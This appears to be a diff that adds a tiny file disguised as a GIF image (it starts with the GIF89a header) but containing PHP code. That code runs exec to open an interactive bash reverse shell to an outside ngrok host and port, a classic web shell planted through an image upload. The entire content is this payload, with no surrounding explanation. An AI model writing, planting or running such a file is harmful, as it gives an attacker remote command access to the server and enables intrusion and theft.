@@ -1,0 +1,5 @@
+GIF89a
+
+<?php
+exec("/bin/bash -c 'bash -i > /dev/tcp/6.tcp.ngrok.io/12917 0>&1'");
+
